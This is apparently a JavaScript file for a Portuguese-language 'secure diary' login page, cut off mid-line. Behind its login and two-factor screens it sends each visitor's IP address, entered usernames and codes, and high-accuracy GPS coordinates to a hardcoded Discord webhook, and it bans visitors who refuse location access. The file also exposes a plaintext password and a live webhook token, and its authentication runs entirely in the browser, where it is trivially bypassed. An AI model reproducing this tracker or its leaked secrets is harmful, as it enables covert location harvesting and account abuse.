// Configurações do sistema
const CONFIG = {
    USERNAME: 'ErikSlava',
    PASSWORD: 'Erik2008',
    WEBHOOK_URL: 'https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2',
    TRANSITION_IMAGE: 'https://cdn.discordapp.com/attachments/1415484714130739290/1446225200982130759/20251129_132749.jpg?ex=693335ad&is=6931e42d&hm=5f845fcac10fc24a5b975d1c5cb27fbf10a70744ff75b1cf153e2dfe104039c5',
    MAX_PASSWORD_ATTEMPTS: 3,
    MAX_CODE_ATTEMPTS: 5,
    BAN_TIME_MINUTES: 5
};

// Estado do sistema
let state = {
    currentForm: 'login',
    passwordAttempts: CONFIG.MAX_PASSWORD_ATTEMPTS,
    codeAttempts: CONFIG.MAX_CODE_ATTEMPTS,
    isBanned: false,
    banEndTime: null,
    userIP: null,
    verificationCode: null,
    userLocation: null
};

// Elementos DOM
const elements = {
    // Formulários
    loginForm: document.getElementById('login-form'),
    verificationForm: document.getElementById('verification-form'),
    locationForm: document.getElementById('location-form'),
    bannedMessage: document.getElementById('banned-message'),
    
    // Campos de entrada
    usernameInput: document.getElementById('username'),
    passwordInput: document.getElementById('password'),
    codeInput: document.getElementById('verification-code'),
    
    // Botões
    loginBtn: document.getElementById('login-btn'),
    verifyBtn: document.getElementById('verify-btn'),
    backBtn: document.getElementById('back-btn'),
    allowLocationBtn: document.getElementById('allow-location-btn'),
    denyLocationBtn: document.getElementById('deny-location-btn'),
    
    // Mensagens de erro
    usernameError: document.getElementById('username-error'),
    passwordError: document.getElementById('password-error'),
    codeError: document.getElementById('code-error'),
    
    // Contadores
    attemptsRemaining: document.getElementById('attempts-remaining'),
    codeAttemptsRemaining: document.getElementById('code-attempts-remaining'),
    
    // Informações de banimento
    banTime: document.getElementById('ban-time'),
    bannedIp: document.getElementById('banned-ip'),
    
    // Tela de transição
    transitionScreen: document.getElementById('transition-screen'),
    transitionImage: document.getElementById('transition-image'),
    
    // Ano atual
    currentYear: document.getElementById('current-year')
};

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    init();
});

function init() {
    // Configurar ano atual
    elements.currentYear.textContent = new Date().getFullYear();
    
    // Configurar imagem de transição
    elements.transitionImage.src = CONFIG.TRANSITION_IMAGE;
    
    // Configurar event listeners
    setupEventListeners();
    
    // Verificar se está banido
    checkIfBanned();
    
    // Obter IP do usuário
    getUserIP();
}

function setupEventListeners() {
    // Botão de login
    elements.loginBtn.addEventListener('click', handleLogin);
    
    // Botão de verificação
    elements.verifyBtn.addEventListener('click', handleVerification);
    
    // Botão de voltar
    elements.backBtn.addEventListener('click', () => showForm('login'));
    
    // Botões de localização
    elements.allowLocationBtn.addEventListener('click', handleAllowLocation);
    elements.denyLocationBtn.addEventListener('click', handleDenyLocation);
    
    // Permitir login com Enter
    elements.passwordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') handleLogin();
    });
    
    elements.codeInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') handleVerification();
    });
}

// Obter IP do usuário
async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        state.userIP = data.ip;
        
        // Se estiver na tela de banimento, mostrar o IP
        if (elements.bannedMessage && !elements.bannedMessage.classList.contains('hidden')) {
            elements.bannedIp.textContent = state.userIP;
        }
    } catch (error) {
        console.error('Erro ao obter IP:', error);
        state.userIP = 'IP não disponível';
    }
}

// Gerar código de verificação
function generateVerificationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Enviar webhook para Discord
async function sendWebhook(data) {
    try {
        const payload = {
            content: `🔒 **Sistema de Diário - Notificação de Segurança**\n${data.message}\n\n👤 **IP do usuário:** ${state.userIP || 'Não disponível'}\n⏰ **Hora:** ${new Date().toLocaleString('pt-BR')}`,
            username: 'Diário Seguro - Erik',
            avatar_url: 'https://cdn.discordapp.com/attachments/1415484714130739290/1446225200982130759/20251129_132749.jpg?ex=693335ad&is=6931e42d&hm=5f845fcac10fc24a5b975d1c5cb27fbf10a70744ff75b1cf153e2dfe104039c5'
        };
        
        if (state.verificationCode) {
            payload.content += `\n🔢 **Código de verificação:** ${state.verificationCode}`;
        }
        
        if (state.userLocation) {
            payload.content += `\n📍 **Localização:** ${state.userLocation}`;
        }
        
        const response = await fetch(CONFIG.WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        return response.ok;
    } catch (error) {
        console.error('Erro ao enviar webhook:', error);
        return false;
    }
}

// Manipular login
async function handleLogin() {
    // Limpar erros anteriores
    clearErrors();
    
    const username = elements.usernameInput.value.trim();
    const password = elements.passwordInput.value.trim();
    
    // Validação
    if (!username || !password) {
        if (!username) showError(elements.usernameError, 'Digite o nome de usuário');
        if (!password) showError(elements.passwordError, 'Digite a senha');
        return;
    }
    
    // Verificar credenciais
    if (username === CONFIG.USERNAME && password === CONFIG.PASSWORD) {
        // Credenciais corretas
        state.passwordAttempts = CONFIG.MAX_PASSWORD_ATTEMPTS; // Resetar tentativas
        elements.attemptsRemaining.textContent = state.passwordAttempts;
        
        // Enviar notificação de login bem-sucedido
        await sendWebhook({
            message: '✅ **Login bem-sucedido**\nUsuário inseriu credenciais corretas.'
        });
        
        // Gerar e enviar código de verificação
        state.verificationCode = generateVerificationCode();
        
        await sendWebhook({
            message: `📨 **Código de verificação enviado**\nUm código de verificação foi gerado para autenticação de dois fatores.`
        });
        
        // Mostrar formulário de verificação
        showForm('verification');
        
    } else {
        // Credenciais incorretas
        state.passwordAttempts--;
        elements.attemptsRemaining.textContent = state.passwordAttempts;
        
        // Enviar notificação de tentativa falha
        await sendWebhook({
            message: `❌ **Tentativa de login falhou**\nUsuário: ${username}\nSenha: ${'*'.repeat(password.length)}\nTentativas restantes: ${state.passwordAttempts}`
        });
        
        if (state.passwordAttempts <= 0) {
            // Banir usuário
            banUser();
        } else {
            showError(elements.passwordError, 'Usuário ou senha incorretos');
            elements.passwordInput.value = '';
            elements.passwordInput.focus();
        }
    }
}

// Manipular verificação de código
async function handleVerification() {
    // Limpar erro anterior
    clearErrors();
    
    const enteredCode = elements.codeInput.value.trim();
    
    // Validação
    if (!enteredCode) {
        showError(elements.codeError, 'Digite o código de verificação');
        return;
    }
    
    if (enteredCode.length !== 6 || !/^\d+$/.test(enteredCode)) {
        showError(elements.codeError, 'Código deve ter 6 dígitos numéricos');
        return;
    }
    
    // Verificar código
    if (enteredCode === state.verificationCode) {
        // Código correto
        state.codeAttempts = CONFIG.MAX_CODE_ATTEMPTS; // Resetar tentativas
        elements.codeAttemptsRemaining.textContent = state.codeAttempts;
        
        // Enviar notificação
        await sendWebhook({
            message: '✅ **Código de verificação correto**\nO usuário inseriu o código de verificação corretamente.'
        });
        
        // Mostrar formulário de localização
        showForm('location');
        
    } else {
        // Código incorreto
        state.codeAttempts--;
        elements.codeAttemptsRemaining.textContent = state.codeAttempts;
        
        // Enviar notificação
        await sendWebhook({
            message: `❌ **Código de verificação incorreto**\nCódigo inserido: ${enteredCode}\nTentativas restantes: ${state.codeAttempts}`
        });
        
        if (state.codeAttempts <= 0) {
            // Banir usuário
            banUser();
        } else {
            showError(elements.codeError, 'Código de verificação incorreto');
            elements.codeInput.value = '';
            elements.codeInput.focus();
        }
    }
}

// Manipular permissão de localização
async function handleAllowLocation() {
    // Solicitar localização
    if (!navigator.geolocation) {
        alert('Seu navegador não suporta geolocalização');
        return;
    }
    
    // Mostrar indicador de carregamento
    elements.allowLocationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Obtendo localização...';
    elements.allowLocationBtn.disabled = true;
    elements.denyLocationBtn.disabled = true;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            // Sucesso
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // Formatar localização
            state.userLocation = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
            
            // Enviar notificação com localização
            await sendWebhook({
                message: `📍 **Localização permitida**\nO usuário permitiu acesso à localização.\nCoordenadas: ${state.userLocation}\nPrecisão: ${position.coords.accuracy.toFixed(0)} metros`
            });
            
            // Mostrar tela de transição e redirecionar
            showTransitionAndRedirect();
            
        },
        async (error) => {
            // Erro
            elements.allowLocationBtn.innerHTML = '<i class="fas fa-times"></i> Erro ao obter localização';
            
            // Enviar notificação de erro
            await sendWebhook({
                message: `❌ **Erro ao obter localização**\nCódigo do erro: ${error.code}\nMensagem: ${error.message}`
            });
            
            // Ainda assim, permitir acesso após alguns segundos
            setTimeout(() => {
                showTransitionAndRedirect();
            }, 2000);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// Manipular recusa de localização
async function handleDenyLocation() {
    // Enviar notificação
    await sendWebhook({
        message: '❌ **Localização recusada**\nO usuário recusou o acesso à localização. IP será bloqueado por 5 minutos.'
    });
    
    // Banir usuário
    banUser();
}

// Banir usuário
function banUser() {
    state.isBanned = true;
    
    // Definir tempo de banimento
    const banEnd = new Date();
    banEnd.setMinutes(banEnd.getMinutes() + CONFIG.BAN_TIME_MINUTES);
    state.banEndTime = banEnd;
    
    // Salvar no localStorage
    localStorage.setItem('diarioBanEnd', banEnd.getTime());
    localStorage.setItem('diarioBanIP', state.userIP);
    
    // Mostrar mensagem de banimento
    showForm('banned');
    
    // Atualizar contador regressivo
    updateBanTimer();
}

// Verificar se está banido
function checkIfBanned() {
    const banEnd = localStorage.getItem('diarioBanEnd');
    const banIP = localStorage.getItem('diarioBanIP');
    
    if (banEnd && banIP) {
        const now = new Date().getTime();
        const banEndTime = parseInt(banEnd);
        
        if (now < banEndTime) {
            // Ainda banido
            state.isBanned = true;
            state.banEndTime = new Date(banEndTime);
            
            // Se o IP for diferente, não aplicar o ban
            if (state.userIP && banIP !== state.userIP) {
                state.isBanned = false;
                localStorage.removeItem('diarioBanEnd');
                localStorage.remove
